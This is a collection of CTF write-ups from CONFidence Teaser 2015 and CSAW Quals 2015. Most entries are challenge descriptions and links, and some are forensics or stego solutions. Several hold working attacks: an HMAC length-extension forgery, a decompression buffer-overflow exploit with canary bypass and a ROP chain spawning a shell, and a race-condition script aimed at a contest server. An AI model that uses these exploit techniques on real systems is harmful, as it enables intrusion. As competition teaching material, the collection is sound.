    Query: /?a=sign&m=old&d=%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%4d%6c%75%e7%bb%53%36%ab%5d%d6%3d%15%6a%0e%7d%b5
	Output: 24049ad4b163dd828bd71a8a5f37b642
	
The previous output is the HMAC result of the data  `123\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x02\x00\x00\x00\x00\x00\x00get flag`. Send it and collect the flag.

    Query: /?a=verify&m=new&d=123%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%18%02%00%00%00%00%00%00get+flag&s=24049ad4b163dd828bd71a8a5f37b642
	
### Flag

DrgnS{MyHardWorkByTheseWordsGuardedPleaseDontStealMasterCryptoProgrammer}

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CONFIDENCE_TEASER/crypto/machacking>
* <https://b01lers.net/challenges/CONFidence%20Teaser%202015/mac%20hacking/49/>
# CONFidence CTF Teaser Power Level

**Category:** Crypto
**Points:** 50
**Solves:** 97
**Description:**

> Here's a [C file](crypto50.c). Decode this:

> 8,223,137,2,42,8,28,186,97,114,42,74,163,238,163,23,121,2,74,158,163,23,135,2,193,158,2,62,2,184,44,20,2,137,217,196,62,249,159,137,44,111,106,111,217,50,106,111,2,62,196,217,137,2,20,106,146,111,151


## Write-up

(TODO)

## Other write-ups and resources

* <https://0x1337seichi.wordpress.com/2015/04/26/confidance-2015-ctf-teaser-power-level-writeup-crypto-50/>
* <https://b01lers.net/challenges/CONFidence%20Teaser%202015/Power%20level/48/>
# CONFidence CTF Teaser The Real Mac Hacking

**Category:** Crypto
**Points:** 400
**Solves:** 1
**Description:**

> Now, let's try something a bit more difficult... [Check this out](xor.php)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CONFidence CTF Teaser Apache Underwear

**Category:** Network/web
**Points:** 400
**Solves:** 26
**Description:**

> Pwn this [server](134.213.136.187:8080). Keep in mind, this is a web challenge :-O.

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CONFIDENCE_TEASER/web/apacheunderwear>
# CONFidence CTF Teaser Here Be Dragons

**Category:** Programming
**Points:** 300
**Solves:** 14
**Description:**

> As kids, we all dreamt of collecting eggs in the most optimal ways. We know you did too! Now, we're giving you a chance to have your dreams come true - just connect to 134.213.29.59:7001 and join the fun!

> The PRNG is std::mt19937.

>Note: the server has been recently updated to apply a small fix to the solution verification logic. Please re-run your solvers to obtain the new flag.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CONFidence CTF Teaser Quarantine

**Category:** Pwning
**Points:** 500
**Solves:** 5
**Description:**


> The developers of this service think they have found a way to automatically thwart all memory corruption attacks. Can you prove them wrong?
>
> The service is running at 134.213.135.43:10000.
>
> Files: [vm.so](vm.so) [quarantine](quarantine)


## Write-up

(TODO)

## Other write-ups and resources

* <http://int3pids.blogspot.in/2015/04/confidence-2015-teaser-quarantine-write.html>
# CONFidence CTF Teaser Quine

**Category:** Pwning
**Points:** 400
**Solves:** 19
**Description:**

> Yo Dawg! I herd you like compression!
>
> Files: [quine](quine) [libc.so.6](libc.so.6)
>
> Running at 95.138.166.12:31337


## Write-up

by [evgenymartynov](https://github.com/evgenymartynov)

You are provided with a binary that implements decompression-as-a-service with a simple custom data format. The decompression appends data to the output buffer either by taking a literal byte from the input stream, or reusing a slice of the output buffer.

As far as protection goes, we have ASLR and NX, but no PIE. We also have `system()@plt` in the binary, which helps.

There are two vulnerabilities that lead to a working exploit, both of which are in the decoder:
* Output buffer size is never checked -- it's trivial to cause an overflow;
* Reusing the slice of output allows for negative offsets, copying data backwards into the array.

Decompiled function is as follows:
```C
size_t __cdecl decode_buf(char *res, int reslim /* BUG: never used */, char *inp, int inplim) {
  size_t i; // [sp+14h] [bp-24h]@1
  int back_idx; // [sp+1Ch] [bp-1Ch]@9
  int copy_len; // [sp+20h] [bp-18h]@9
  bitstream input; // [sp+24h] [bp-14h]@1

  bitstream_constructor(&input, inp, inplim);
  i = 0;
  while ( num_bits_left(&input) != 0 ) {
    if ( extract_bits(&input, 1u) )  {
      if ( num_bits_left(&input) <= 7 )
        die("Invalid input buffer");
      res[i++] = extract_bits(&input, 8u);
    } else {
      if ( num_bits_left(&input) == 0 )
        die("Invalid input buffer");
      if ( extract_bits(&input, 1u) == 0 )      // terminating cond
        return i;
      back_idx = extract_varint(&input);
      copy_len = extract_varint(&input);
      if ( &res[i - back_idx - 1] < res )
        die("Invalid input buffer");
      if ( copy_len > i )
        die("Invalid input buffer");
      memcpy(&res[i], &res[i - back_idx - 1], copy_len);  // BUG: back_idx can be negative
      i += copy_len;
    }
  }
  return i;
}
```

In the calling code, the stack frame looks like the following:
```C
  char output_smashable[2048]; // [sp+2Bh] [bp-2005h]@7
  char input_stream[1024]; // [sp+82Bh] [bp-1805h]@7
  char __unused__[2049]; // [sp+102Bh] [bp-1005h]@3
  int canary; // [sp+202Ch] [bp-4h]@1
```

The complication is that if we try to smash the output buffer, we will trash the input stream which will affect the decoding process. In effect, some data will be doubly decoded (almost like a quine).

So, the plan of attack was to send a message that decodes to ROP, then the quiny bit, then a sequence of copies that smashes the buffer, then a copy operation that overwrites the next few instructions with the quiny bit.

In turn, the quiny bit needs to do the prep work for getting past the canary and copying the ROP chain. Then it can return, triggering the ROP.

We've reserved 200 bytes for ROP, 200 bytes for the quiny bit, and tried to smash the stack leading to a close-enough alignment so that a copy of the quiny payload would overwrite the current instructions. With trial and error, we got a payload to write 2541 bytes before an overlap occurs:

```python
for c in ROP + CODE:                                                             
  literal(ord(c))                                                                
literal(0)                                                                       
for i in xrange(11):                                                             
  i = 2**i                                                                       
  copy(i-1, i)                                                                   
                                                                                 
for i in xrange(3):                                                              
  literal(0x41)                                                                  
copy(255, 80)                                                                    
```

Cool, so now we can copy the `CODE` (quiny) bytes forward.

```python
copy(2541-202, 100)
```

We have chosen our payload thus far to generate an even number of bytes (multiple-of-8 bits for the compressed sequence so far) so that the overwrite lines up nicely. It's 491 bytes, 0 bits long right after this poing. Execution will continue in the quiny `CODE` bit. This is why it had to be doubly-compressed as mentioned above.

Now, what should `CODE` do? Well, we're still unpacking from the inside of our input buffer, and we have a lot of bytes to smash. We had trouble aligning the first few instructions, but the following seemed to align the quine execution and smash the stack adequately:
```python
for i in xrange(4):
  literal(0xff)  # encodes to 28 x 1-bits
literal(0x41)                                                                    
literal(0x42)                                                                    
literal(0x43)                                                                    
literal(0x44)                                                                    
# n=2639 bytes overwritten from beginning of output buffer so far
copy(2000, 1024*3 - 2639)                                                        
# n=3072                                                                         
copy(2048, 2048)                                                                 
copy(4096, 3072)                                                                 
# n=8192                                                                         
literal(0x41)                                              

# We are now at the canary. One more literal(0x41) causes a stascksmash abort.
```

To bypass the canary, we use the second bug:
```python
copy(0xffffffff, 4)  # canary                                                    
skip = 12   # saved regs and 16-byte align, whatever
for i in xrange(skip):                                                           
  literal(0x43)                                                                  
copy(8192+4+skip, 200)  # rop
```

The offset for the last `copy()` is calculated by taking number of bytes copied so far, since ROP starts at offset 0. We can now ROP freely.

The ropchain isn't pretty, and it has a lot of shamanism. `fgets()` crashed reliably, don't know why, so we copied in a `"sh\0\0"` with `scanf("%u")`. Also, the chain had to be padded with a bunch of `A`s, otherwise the decoder shits itself. If anyone can explain why, please edit this writeup adding a note below.

```python
FGETS = 0x080486c0  # unused                                                     
STDIN = 0x0804b060  # unused                                                     
SCANF = 0x08048700                                                               
SYSTEM = 0x080486a0                                                              
EXIT = 0x08048790                                                                
FMT = 0x0804901b  # "%u"                                                         
BUF = 0x0804b100  # something writeable                                          
BUMP_ESP = 0x0804864e  # add esp, 0x08 ; pop ebx ; ret  ;                        

ROP = ''                                                                         
ROP += pack('IIII', SCANF, BUMP_ESP, FMT, BUF) + "ABCD"                          
ROP += pack('III', SYSTEM, EXIT, BUF)                                            
ROP += pack('II', 0, 0)                                                          
ROP = ROP.ljust(170, '\0')                                                       
ROP = ROP.ljust(200, 'A')                                                        
```

Running this, we get a shell and after a `cat /*/*/*flag*`, we get `DrgnS{n0w_y0u_c4n_d3compr3ss_wh1Ie_u_dec0mpreSS}`. Cute.

The full exploit is also in the repo with a traffic log. Enjoy.

## Other write-ups and resources

* <https://gist.github.com/g05u/990cc267c0ea1455e39a>
# CONFidence CTF Teaser

* <https://ctf.dragonsector.pl/?challenges>
* [Scoreboard](https://ctf.dragonsector.pl/?scoreboard) or [local alternative](score.txt)

## Completed write-ups

* [crypto/mac-hacking-150](crypto/mac-hacking-150)
* [pwning/quine-400](pwning/quine-400)
* [reverse/so-easy-100](reverse/so-easy-100)
* [stegano/a-png-tale-200](stegano/a-png-tale-200)
* [web/practical-numerology-300](web/practical-numerology-300)

## External write-ups only

* [crypto/power-level-50](crypto/power-level-50)
* [network/apache-underwear-400](network/apache-underwear-400)
* [pwning/quarantine-500](pwning/quarantine-500)

## Missing write-ups

* [crypto/the-real-mac-hacking-400](crypto/the-real-mac-hacking-400)
* [programming/here-be-dragons-300](programming/here-be-dragons-300)
# CONFidence CTF Teaser So Easy

**Category:** Reverse Engineering
**Points:** 100
**Solves:** 144
**Description:**

> [Get the flag](re_100_final) (tested on Ubuntu 14.04.2 LTS).

## Write-up

by [HoLyVieR](https://github.com/HoLyVieR)

At a high-level the program executed the following instructions in the main:

	char flag[32];
	char expected[] = "dRGNs{tHISwASsOsIMPLE}";
	char* output = "Nope.\n";

	puts("Please enter secret flag:");
	scanf("%31s", flag);

	// Some logic that switched uppercase character to lowercase character 
	// and lowercase character to uppercase character

	if (strcmp(flag, expected) == 0) {
		output = "Excellent Work!\n";
	}

	printf(output);
	exit(0);
	
This indeed really seemed simple, but when we entered ' DrgnS{ThisWasSoSimple}' , it returned `Nope.`. 

When digging a bit further, we can see that printf is hooked and it actually executes the code at the offset `0x0804873C`. In that function the flag we entered is actually compared to a value located at the offset `0x804B0A4`. Since the value generated at that offset seems to be generated at runtime, it was best just to place a breakpoint at `0x0804873C` and look in memory at the value stored at `0x804B0A4`. The value stored is `dRGNs{nOTeVENwARMEDuP}` and if we reverse the lowercase/uppercase switch process it gives us `DrgnS{NotEvenWarmedUp}`.

## Other write-ups and resources

* <http://capturetheswag.blogspot.com.au/2015/04/confidence-ctf-2015-so-easy-reversing.html>
# CONFidence CTF Teaser A PNG Tale

**Category:** Steganography
**Points:** 200
**Solves:** 43
**Description:**

> Find the flag hidden in this [PNG file](hidden.png).

## Write-up

by [polym](https://github.com/abpolym)

Note: This writeup is based on [This Writeup](http://mail.pri-vate.net/tmp/writeup-CONFidence_DS_CTF_2015-200stegano-A_PNG_Tale.txt).

We are given a 800x800 PNG picture that seemingly contains no hidden information on first sight:

![](hidden.png)

Examining the picture with common steganotools such as `stegsolve` or `outguess` and hexeditors, we also don't see anything obvious.

However, PNG applies certain [filters](http://www.w3.org/TR/PNG-Filters.html) ([more](http://www.libpng.org/pub/png/book/chapter09.html).[source](http://en.wikipedia.org/wiki/Portable_Network_Graphics#Filtering)) before compression.

There are several filter types that can be applied, such as `None` (byte `0x0`), `Sub` (byte `0x1`), `Up` (byte `0x2`) etc.

Bytes of these filter types can be used to hide information, i.e. the flag, in the PNG.

In our case, we have to decompress the PNG `IDAT` chunk data and extract the filter type bytes from the decompressed data.

[This script](png_filters.py) does exactly that:

```bash
$ python png_filters.py hidden.png 
PNG Signature: ('\x89', 'P', 'N', 'G', '\r', '\n', '\x1a', '\n')
Pos : 8
Type: IHDR
Size: 13
CRC : 5412913F

Pos : 33
Type: IDAT
Size: 10980
CRC : 98F96EEB

Pos : 11025
Type: IEND
Size: 0
CRC : AE426082

Data length in PNG file :  10980
Decompressed data length:  1920800
Flag: DrgnS{WhenYouGazeIntoThePNGThePNGAlsoGazezIntoYou}
```

The flag is `DrgnS{WhenYouGazeIntoThePNGThePNGAlsoGazezIntoYou}`.

## Other write-ups and resources

* <http://mail.pri-vate.net/tmp/writeup-CONFidence_DS_CTF_2015-200stegano-A_PNG_Tale.txt>
# CONFidence CTF Teaser Practical Numerology

**Category:** Web
**Points:** 300
**Solves:** 56
**Description:**

> Here's a [lotto script](index.php), running on my [old and slow computer](134.213.136.172). Can you pwn it?  

## Write-up

by [HoLyVieR](https://github.com/HoLyVieR)

### Explanation

This challenge was a timing attack against the server. The server performs the following steps when we give him a wrong guess:

 1. Outputs the expected answer.
 2. Outputs the guess we provided.
 3. Updates the session with a new answer.
 
If we manage the make the step 2 take relatively long amount of time, we can have a window where we know the expected answer and it hasn't been updated yet. To make the step 2 take a long amount of time, we can simply send a guess with a really long value. In the example below, I used a value with a length of 1000000. 

### Script

	import httplib
	import thread

	# Shared value that the first thread will write the expected value
	aaa = ""

	# Thread 1 does the request that take a long amount of time and sends the
	# results to Thread 2 with the shared value.
	def thread1(abc):
		global aaa

		try:
			headers = {
				"Content-Type": "application/x-www-form-urlencoded",
				"Cookie": "PHPSESSID=1337cookie"
			}
			conn1 = httplib.HTTPConnection("134.213.136.172")
			conn1.request("POST", "/", "guess=" + ("a"*1000000), headers)
			
			# Reading only the expected value will not wait for everything to be received.
			g = conn1.getresponse().read(92)
			
			# Sending it to Thread 2
			aaa = g[8:8+80]
		except Exception:
			import traceback
			print traceback.format_ex
		
	# Thread 2 receives the value from Thread 1 and sends it before the flag 
	# is updated.
	def thread2(abc):
		global aaa

		try:
			conn2 = httplib.HTTPConnection("134.213.136.172")
			headers = {
				"Content-Type": "application/x-www-form-urlencoded",
				"Cookie": "PHPSESSID=1337cookie"
			}
			
			while aaa == "":
				pass
				
			conn2.request("POST", "/", "guess=" + aaa, headers)
			a = conn2.getresponse().read()
			
			# This will output the flag if we sent it just in time.
			print(a)
		except Exception:
			import traceback
			print traceback.format_ex
		
		
	thread.start_new_thread(thread1, ("test",))
	thread.start_new_thread(thread2, ("test",))

	while 1:
	   pass
	   
### Flag

DrgnS{JustThinkOutOfTheBoxSometimes...}

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CONFIDENCE_TEASER/web/practicalnumerology>
# Contribution guide

Please take a moment to review this document in order to make the contribution process easy and effective for everyone involved.

## Adding a new write-up entry

1. Each CTF gets its own folder in the root of this repository. For example, ‘Foo Bar CTF 2015’ would get a folder named `foo-bar-ctf-2015`.
2. Every CTF challenge gets its own subfolder within that folder with an appendix indicating its value. For example, all files related to the ‘Foo Bar CTF 2015’ challenge named ‘Sucky sandbox’, which is worth `150` points, would be located in `foo-bar-ctf-2015/sucky-sandbox-150`.
3. Every CTF challenge folder needs a Markdown-formatted `README.md` file, e.g. `foo-bar-ctf-2015/sucky-sandbox-150/README.md`. This file contains any details about the challenge, the main write-up itself, and links to other write-ups and resources. The folder should also contain the source files needed to reproduce the challenge.
4. Once you’re done adding the entry or making your changes, submit a pull request using the GitHub web interface.
5. Finally, make sure you follow our committing rules

## Changing an existing entry

1. Feel free to make any changes you see fit. Add a link to a write-up on your blog, add missing source files, clarify explanations in the write-up, or — if you’ve found a better way to solve a challenge — simplify the existing solution.
2. Once you’re done, submit a pull request using the GitHub web interface.

## Committing rules
These rules exist to keep the repo maintainable and complete. Please consider following them.

1. Update the root `big-ctf/README.md` file, when adding a writeup to `big-ctf/task/`. We have three different sections:
	* `Completed write-ups` - Tasks, for which there is at least one local repo writeup (see the `Write-up` section of each task)
	* `External write-ups only` - Tasks, for which there is at least one external writeup (see the `Other write-ups and resources` section of each task, but no local writeup
	* `Missing write-ups` - Tasks, for which there are no writeups available (yet).
2. If there already exists a writeup in the `Write-up` section and you want to add another local writeup:
	- Add another `Alternative write-up` section above the `Other write-ups and resources` section
3. Do not add files that have a filesize bigger than 15MB to keep the repo relatively small. Upload the file instead to a service or reference it from somewhere else.
4. Consider following these [committing rules](https://atom.io/docs/latest/contributing#git-commit-messages). For this repo, we like to use these [emojis](http://www.emoji-cheat-sheet.com/):
	* :memo: when adding a writeup to the `Write-up` section of a task
	* :floppy_disk: when adding resources for a task, e.g. files or scripts
	* :link: when adding a writeup link to the `Other write-ups and resources` section of a task
	* :pill: when fixing broken links or corrupt Markup stuff
	* :books: when updating the structure of this repo or adding a ctf skeleton structure
	* :fire: when deleting files
5. If you want to add a new CTF directory/structure (skeleton) with as little trouble as possible, then consider using the `genctf.py` tool from [our tools repo](https://github.com/ctfs/write-ups-tools/)
# CSAW QUALS 2015: bricks-of-gold-500

**Category:** Crypto
**Points:** 500
**Solves:** 26
**Description:**

> We've captured this encrypted file being smuggled into the country. All we know is that they rolled their own custom CBC mode algorithm - its probably terrible.
>
> HINT: take a second look at the file for elements needed for the crypto
>
> [bricks_of_gold_40d12e05cd6d67ed51d29a6da39d6878](bricks_of_gold_40d12e05cd6d67ed51d29a6da39d6878)


## Write-up

(TODO)

## Other write-ups and resources

* <http://www.truedigitalsecurity.com/blog/2015/09/22/csaw-2015-crypto-500-bricks-of-gold-writeup/>
* <https://www.zybuluo.com/romangol/note/179586>
* <https://github.com/negasora/CTFWriteups/tree/master/CSAW%20Quals%202015/Bricks%20of%20Gold>
# CSAW QUALS 2015: notesy-100

**Category:** Crypto
**Points:** 100
**Solves:** 597
**Description:**

> http://54.152.6.70/
>
> The flag is not in the flag{} format.
> 
> HINT: If you have the ability to encrypt and decrypt, what do you think the flag is?
>
> HINT: https://www.youtube.com/watch?v=68BjP5f0ccE
>
>


## Write-up

by [x0w1](https://github.com/x0w1)

It's a simple substitution cypher. Since we have nothing to decrypt or encrypt, I decided to extract the key (encrypt the alphabet) and submit it as the flag, and it worked.

The flag:
_UNHMAQWZIDYPRCJKBGVSLOETXF_

## Other write-ups and resources

* <http://ctf-for-beginners.blogspot.com/2015/09/write-up-csaw-ctf-2015-crypto-notesy-100.html>
* <http://fadec0d3.blogspot.com/2015/09/csaw-2015-crypto-50-50-50-100.html>
* <http://blog.bitsforeveryone.com/2015/09/writeup-csaw-2015-crypto-100-notesy.html>
* <https://github.com/Alpackers/CTF-Writeups/tree/master/2015/CSAW-CTF/Crypto/notesy>
# CSAW QUALS 2015: ones_and_zer0s-50

**Category:** Crypto
**Points:** 50
**Solves:** 987
**Description:**

> [eps1.1_ones-and-zer0es_c4368e65e1883044f3917485ec928173.mpeg](eps1.1_ones-and-zer0es_c4368e65e1883044f3917485ec928173.mpeg)


## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/csaw-quals-2015-ones-and-zer0es/>
* <http://fadec0d3.blogspot.com/2015/09/csaw-2015-crypto-50-50-50-100.html>
* <https://github.com/Alpackers/CTF-Writeups/tree/master/2015/CSAW-CTF/Crypto/ones_and_zer0es>
* <http://thekillingtime.com/?p=341>
# CSAW QUALS 2015: punchout-200

**Category:** Crypto
**Points:** 200
**Solves:** 13
**Description:**

> We found these System/360 punch cards and we need to extract the data. We already read the data off for you.
>
> It looks encrypted. Can you help?
>
> HINT: This is actually encrypted. With technology and techniques that were available in 1965
>
> HINT: https://gist.github.com/withzombies/40554f02d6c7055fb0bc
>
> [punchout.tar.xz-24504ddc1e81092010497ee49fc52e1c](punchout.tar.xz-24504ddc1e81092010497ee49fc52e1c)


## Write-up

(TODO)

## Other write-ups and resources

[https://gist.github.com/triazo/f8379a5df446de5dd00e](https://gist.github.com/triazo/f8379a5df446de5dd00e)
# CSAW QUALS 2015: whiter0se-50

**Category:** Crypto
**Points:** 50
**Solves:** 753
**Description:**

> Note: The flag is the entire thing decrypted
>
> [eps1.7_wh1ter0se_2b007cf0ba9881d954e85eb475d0d5e4.m4v](eps1.7_wh1ter0se_2b007cf0ba9881d954e85eb475d0d5e4.m4v)


## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/csaw-quals-2015-whiter0se/>
* <http://fadec0d3.blogspot.com/2015/09/csaw-2015-crypto-50-50-50-100.html>
* <http://www.gameofpwnz.com/?p=135>
* <http://blog.bitsforeveryone.com/2015/09/writeup-csaw-2015-crypto-50-whiter0se.html>
* <http://cafelinux.info/articles/writeups-csaw-2015-crypto-50-whiter0se>
* <https://github.com/Alpackers/CTF-Writeups/tree/master/2015/CSAW-CTF/Crypto/whiter0se>
* <https://github.com/ByteBandits/writeups/blob/master/csaw-quals-2015/crypto/whiter0se/chaitan94/README.md>
# CSAW QUALS 2015: zer0-day-50

**Category:** Crypto
**Points:** 50
**Solves:** 824
**Description:**

> [eps1.9_zer0-day_b7604a922c8feef666a957933751a074.avi](eps1.9_zer0-day_b7604a922c8feef666a957933751a074.avi)


## Write-up

by [x0w1](https://github.com/x0w1)

It looks like a base64 encoded string with '\n' (two printable characters) instead of new lines. Simple one-liner

```bash
cat eps1.9_zer0-day_b7604a922c8feef666a957933751a074.avi | sed 's/\\n//g' | base64 -d
```

gives us the decoded file:

_Evil Corp, we have delivered on our promise as expected. The people of the world who have been enslaved by you have been freed. Your financial data has been destroyed. Any attempts to salvage it will be utterly futile. Face it: you have been owned. We at fsociety will smile as we watch you and your dark souls die. That means any money you owe these pigs has been forgiven by us, your friends at fsociety. The market's opening bell this morning will be the final death knell of Evil Corp. We hope as a new society rises from the ashes that you will forge a better world. A world that values the free people, a world where greed is not encouraged, a world that belongs to us again, a world changed forever. And while you do that, remember to repeat these words: "flag{We are fsociety, we are finally free, we are finally awake!}"_

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/csaw-quals-2015-zer0-day/>
* <http://fadec0d3.blogspot.com/2015/09/csaw-2015-crypto-50-50-50-100.html>
* <https://github.com/Alpackers/CTF-Writeups/tree/master/2015/CSAW-CTF/Crypto/zer0-day>
# CSAW QUALS 2015: airport-200

**Category:** Forensics
**Points:** 200
**Solves:** 196
**Description:**

> [airport_26321e6eac7a7490e527cbe27ceb68c1.zip](airport_26321e6eac7a7490e527cbe27ceb68c1.zip)


## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on these writeups: [1](http://fadec0d3.blogspot.de/2015/09/csaw-2015-forensics-keep-calm-ctf-flash.html) [2](https://github.com/Alpackers/CTF-Writeups/tree/master/2015/CSAW-CTF/Forensics/airport) and [3](http://toh.necst.it/csaw2015/forensics/Airport/).

We are given four PNG pictures named `1.png` to `4.png` and one JPG named `steghide.jpg`.

The PNGs each show an airport from around the world, the JPG shows us the logo of a steganography tool named `steghide`.

The author used the steghide tool with a password that has to be found.

The password consists of the abbreviation of each airport seen in the PNGs.

To find each airport, we can use image reverse search tools like [tineye](https://www.tineye.com/), [image raider](https://www.imageraider.com/) or [Google images](https://images.google.de/).

The airports are:

* HAV - José Martí International Airport
* HKG - Hong Kong International Airport
* LAX - Los Angeles International Airport
* YYZ - Toronto Pearson International Airport

Concating all abbreviations together, we get the passphrase `HAVHKGLAXYYZ`, which we can use to extract data hidden with `steghide`:

![](steghide.png)

The flag is `flag{iH4t3A1rp0rt5}`.

## Other write-ups and resources

* <http://fadec0d3.blogspot.com/2015/09/csaw-2015-forensics-keep-calm-ctf-flash.html>
* <https://github.com/Alpackers/CTF-Writeups/tree/master/2015/CSAW-CTF/Forensics/airport>
* <http://toh.necst.it/csaw2015/forensics/Airport/>
* <http://blog.bitsforeveryone.com/2015/09/writeup-csaw-2015-forensics-airports.html>
* <http://blog.isis.poly.edu/2015/09/21/csaw-ctf-airport.html>
* <https://www.youtube.com/watch?v=rmtJHX-f920>
# CSAW QUALS 2015: flash-100

**Category:** Forensics
**Points:** 100
**Solves:** 809
**Description:**

> We were able to grab an image of a harddrive. Find out what's on it.
>
> [flash_c8429a430278283c0e571baebca3d139.img](https://drive.google.com/file/d/0B_zt1fDAjfM_ZHJkSjdTYThPdmc/view?usp=sharing)

## Write-up

by [polym](https://github.com/abpolym)

We are given an img that we can either mount or view with `FTK Imager`.

However, we can also apply `strings` to the image to get the flag:

```bash
$ strings flash_c8429a430278283c0e571baebca3d139.img  | igrep flag
    Like to a vagabond flag upon the stream,
    Than was his loss, to course your flying flags
[...]
against the world in arms; the black flag waved night and day from the
Over the chair they had thrown a red flag, and to the back of it they
flag{b3l0w_th3_r4dar}
```

The flag is `flag{b3l0w_th3_r4dar}`.

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/csaw-quals-2015-flash/>
* <http://fadec0d3.blogspot.com/2015/09/csaw-2015-forensics-keep-calm-ctf-flash.html>
* <https://p4f.github.io/csaw-online-qual-forensics100/>
* <http://www.gameofpwnz.com/?p=144>
* <http://xd4rker.blogspot.com/2015/09/csaw-ctf-2015-forensics-100-flash-write.html>
* <https://github.com/ViviTurtle/Programming/tree/master/Competitions/CSAW_2015/Flash>
* <http://thekillingtime.com/?p=348>
* <https://www.youtube.com/watch?v=0Vbw7HNlRtc>
* <https://github.com/ByteBandits/writeups/blob/master/csaw-quals-2015/forensics/flash/chaitan94/README.md>
# CSAW QUALS 2015: keep-calm-and-ctf-100

**Category:** Forensics
**Points:** 100
**Solves:** 1064
**Description:**

> My friend sends me pictures before every ctf. He told me this one was special.
>
> Note: this flag doesn't follow the "flag{}" format
>
> [img.jpg](img.jpg)


## Write-up

by [polym](https://github.com/abpolym)

We are given a `jpg`:

![](./img.jpg)

Applying `exiftool` (or `strings`), we see the flag `h1d1ng_in_4lm0st_pla1n_sigh7` in the `Copyright` exif field:

```bash
$ exiftool img.jpg
ExifTool Version Number         : 9.99
File Name                       : img.jpg
Directory                       : .
File Size                       : 92 kB
File Modification Date/Time     : 2015:12:21 19:54:04+01:00
File Access Date/Time           : 2015:12:21 19:55:06+01:00
File Inode Change Date/Time     : 2015:12:21 19:54:04+01:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 72
Y Resolution                    : 72
Exif Byte Order                 : Big-endian (Motorola, MM)
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Copyright                       : h1d1ng_in_4lm0st_pla1n_sigh7
Image Width                     : 600
Image Height                    : 700
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 600x700
Megapixels                      : 0.420
```

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/csaw-quals-2015-keep-calm-and-ctf/>
* <http://fadec0d3.blogspot.com/2015/09/csaw-2015-forensics-keep-calm-ctf-flash.html>
* <https://github.com/ViviTurtle/Programming/tree/master/Competitions/CSAW_2015/Keep%20Calm%20and%20CTF>
* <https://www.youtube.com/watch?v=69NL0LOzj98>
# CSAW QUALS 2015: pcapin-150

**Category:** Forensics
**Points:** 100
**Solves:** 41
**Description:**

> We have extracted a pcap file from a network where attackers were present. We know they were using some kind of file transfer protocol on TCP port 7179. We're not sure what file or files were transferred and we need you to investigate. We do not believe any strong cryptography was employed.
>
> Hint: The file you are looking for is a png
> Hint: The key is not in the bytes, its in the png itself.
>
> [pcapin_73c7fb6024b5e6eec22f5a7dcf2f5d82.pcap](pcapin_73c7fb6024b5e6eec22f5a7dcf2f5d82.pcap)


## Write-up

(TODO)

## Other write-ups and resources

* <https://p4f.github.io/csaw-online-qual-forensics150/>
* <http://reyammer.blogspot.com/2015/09/csawctf-2015-pcapin-forensic-150-write.html>
# CSAW QUALS 2015: sharpturn-400

**Category:** Forensics
**Points:** 400
**Solves:** 110
**Description:**

> I think my SATA controller is dying.
>
> HINT: `git fsck -v`
>
> [sharpturn.tar.xz-46753a684d909244e7d916cfb5271a95](sharpturn.tar.xz-46753a684d909244e7d916cfb5271a95)


## Write-up

by [PLWagner](https://github.com/PLWagner)

The git repo was crushed because of a material glitch. So the file sharp.cpp had some wrong inputs in it. To find the flag, start with:

```bash
$ tar xvf sharpturn.tar.xz
$ cd shrapturn
$ git fsck
Checking object directories: 100% (256/256), done.
error: sha1 mismatch 354ebf392533dce06174f9c8c093036c138935f3
error: 354ebf392533dce06174f9c8c093036c138935f3: object corrupt or missing
error: sha1 mismatch d961f81a588fcfd5e57bbea7e17ddae8a5e61333
error: d961f81a588fcfd5e57bbea7e17ddae8a5e61333: object corrupt or missing
error: sha1 mismatch f8d0839dd728cb9a723e32058dcc386070d5e3b5
error: f8d0839dd728cb9a723e32058dcc386070d5e3b5: object corrupt or missing
missing blob 354ebf392533dce06174f9c8c093036c138935f3
missing blob f8d0839dd728cb9a723e32058dcc386070d5e3b5
missing blob d961f81a588fcfd5e57bbea7e17ddae8a5e61333
```

Next, create a python script to make fit the SHA keys (See the script.py file in the repo). Use the three blobs in order one at the time  in the SHA variable of the script and run it.

Here's the output for the blob 354ebf392533dce06174f9c8c093036c138935f3
```bash
VALID! '354ebf392533dce06174f9c8c093036c138935f3'
